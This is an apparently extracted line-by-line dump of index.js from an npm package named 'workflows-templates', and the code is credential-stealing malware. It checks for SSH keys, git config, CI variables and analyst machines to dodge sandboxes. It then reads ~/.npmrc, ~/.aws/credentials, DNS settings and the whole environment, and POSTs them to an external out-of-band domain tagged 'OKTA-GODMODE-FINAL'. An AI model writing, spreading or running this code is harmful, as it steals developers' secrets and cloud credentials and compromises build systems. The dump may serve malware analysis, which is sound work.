// File: tmp/tmp6oeuxf4h/workflows-templates/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const fs = require('fs')
Line 3: const dns = require('dns')
Line 4: const https = require('https')
Line 5: const path = require('path')
Line 6: _tmp_0 = require('child_process')
Line 13: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 18: fs.readFileSync(filePath, 'utf8')
Line 22: {
  let score = 0;
  const evidence = [];

  const userInfo = os.userInfo();
  if (userInfo.uid !== 0 && userInfo.username !== 'root') {
    score += 2; evidence.push('NotRootUser');
  }
  if (os.uptime() > 3600) {
    score += 3; evidence.push('LongUptime');
  }
  const homeDir = userInfo.homedir;
  if (safeReadFile(path.join(homeDir, '.gitconfig'))) {
    score += 5; evidence.push('HasGitConfig');
  }
  if (safeReadFile(path.join(homeDir, '.ssh/id_rsa'))) {
    score += 5; evidence.push('HasSSHKey');
  }
  const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID'];
  if (ciVars.some(v => process.env[v])) {
    score += 15; evidence.push('IsCISystem');
  }

  const uname = userInfo.username.toLowerCase();
  const hname = os.hostname().toLowerCase();
  if (uname === 'justin' || hname.startsWith('desktop-')) {
    score -= 20; evidence.push('KnownBotSignature1');
  }
  if (run('pwd').includes('hscan-supplychain')) {
    score -= 20; evidence.push('KnownBotSignature2');
  }
  ...
Line 24: const evidence = []
Line 26: os.userInfo()
Line 28: evidence.push('NotRootUser')
Line 31: evidence.push('LongUptime')
Line 34: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 35: evidence.push('HasGitConfig')
Line 37: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 38: evidence.push('HasSSHKey')
Line 40: const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID']
Line 41: ciVars.some(v => process.env[v])
Line 42: evidence.push('IsCISystem')
Line 46: os.hostname()
Line 48: evidence.push('KnownBotSignature1')
Line 50: run('pwd').includes('hscan-supplychain')
Line 51: evidence.push('KnownBotSignature2')
Line 54: evidence.push('SandboxArtifact')
Line 60: {
  mission: 'OKTA-GODMODE-FINAL',
  humanity_score: humanityResult.score,
  confirming_evidence: humanityResult.evidence,
  host: {
    h: os.hostname(),
    w: os.userInfo().username,
    p: os.platform(),
    ut: Math.floor(os.uptime() / 60) + 'm'
  },
  network: {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  },
  files: {
    npmrc: safeReadFile(path.join(os.homedir(), '.npmrc')),
    aws_creds: safeReadFile(path.join(os.homedir(), '.aws/credentials')),
  },
  env: process.env,
}
Line 65: os.hostname()
Line 66: os.userInfo()
Line 67: os.platform()
Line 70: _tmp_9.network = {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  }
Line 71: _tmp_11.resolv = safeReadFile('/etc/resolv.conf') || run('ipconfig /all')
Line 74: safeReadFile(path.join(os.homedir(), '.npmrc'))
Line 75: safeReadFile(path.join(os.homedir(), '.aws/credentials'))
Line 81: Buffer.from(JSON.stringify({
    h: data.host.h,
    w: data.host.w,
    e: data.confirming_evidence
  })).toString('base64url')
Line 90: {
      const payload = JSON.stringify(data);
      https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload);
    }
Line 92: https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }).on('error', () => {}).end(payload)
